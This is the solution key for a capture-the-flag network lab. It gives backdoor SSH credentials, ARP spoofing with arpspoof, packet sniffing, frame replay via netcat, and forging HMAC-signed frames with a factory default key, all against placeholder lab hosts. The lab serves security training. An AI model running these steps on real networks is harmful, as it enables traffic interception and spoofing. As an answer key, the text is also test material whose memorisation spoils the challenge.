# SOLUTION — Erebus network chain (delivery-side only, do NOT ship to players)

## Recon (on the Erebus station terminal)

```bash
ssh gh0st@localhost -p 2222            # backdoor — password: w0rmh0le
#   (or) ssh controlsvc@localhost -p 2222   — official, password: recovery-access
ls -a                                  # gh0st home: reveals .link_notes
cat .link_notes                        # 1st Officer's method note
cat /opt/station/modules/link_maint.txt        # maint troubleshooting note (link map)
cd /opt/station/modules && cat */*.conf ; cd -
cat /opt/station/logs/keymgmt.log      # key audit: relay.key never rotated (factory default)
linkstat
```

The subsystem configs + `.link_notes` state the angle: the ground feed is
unauthenticated (a stale frame passes), and the AI (`sentry`) checks freshness +
a signature — but the signing key is the unrotated factory default.

```bash
cat /opt/station/modules/comms_relay/relay.key    # RELAY-FACTORY-DEFAULT
```

Identify the two endpoints from `./linkstat` (neighbour table) / recon:
`beacon_relay` (transmitter) and `landfall_link` (ground).

## Get in the middle (real ARP — standard tooling)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
arpspoof -i eth0 -t <landfall_ip> <beacon_ip>  &
arpspoof -i eth0 -t <beacon_ip>   <landfall_ip> &
```

## EASY flag — capture the transmission

```bash
tcpdump -i eth0 -A 'tcp port 9101'
```

Read a frame:

```
TM|1487|20:40:58Z|HS:NOMINAL|SES:crew01@shell,...|TOK:CTF{wire_....}|CRC:....
```

The `TOK:` value is the **easy flag**.

## MID flag — go dark

**a) Blind the ground.** Resend a captured frame to `landfall_link:9101`. It has
no freshness check, so the duplicate seq is accepted:

```bash
# netcat is installed; or use python if you prefer.
printf 'TM|1487|20:40:58Z|HS:NOMINAL|SES:crew01@shell|TOK:...|CRC:....\n' \
  | nc <landfall_ip> 9101
# python alt:
#   python3 -c 'import socket;socket.create_connection(("<landfall_ip>",9101)).sendall(b"<frame>\n")'
```

**b) Blind the AI.** `sentry_watcher:9102` needs a *fresh* seq and a valid MAC.
Sign a fresh frame with the default key (see `common/frame.py` for the format —
`MAC = HMAC-SHA256(frame, key)[:16]`), using a seq above the current beacon seq:

```python
import frame as F, socket
line = F.sign(F.build(500000, "00:00:00Z", "NOMINAL", "ghost@x", "none"),
              "RELAY-FACTORY-DEFAULT")
socket.create_connection(("<sentry_ip>", 9102)).sendall((line + "\n").encode())
```

**Confirm:**

```bash
./linkstat        # ground: blinded, station-ai: blinded -> STATION DARK + mid flag
```

## Notes

- `solution/solve.py` implements steps 4a/4b at the frame level (used by the test).
- `tests/test_network_lab.py` proves the full logic without Docker/ARP.
- A plain replay against the AI fails (freshness); an unsigned frame fails
  (MAC). Both legs are required — that's why the mid flag needs ARP + replay +
  the default key together.
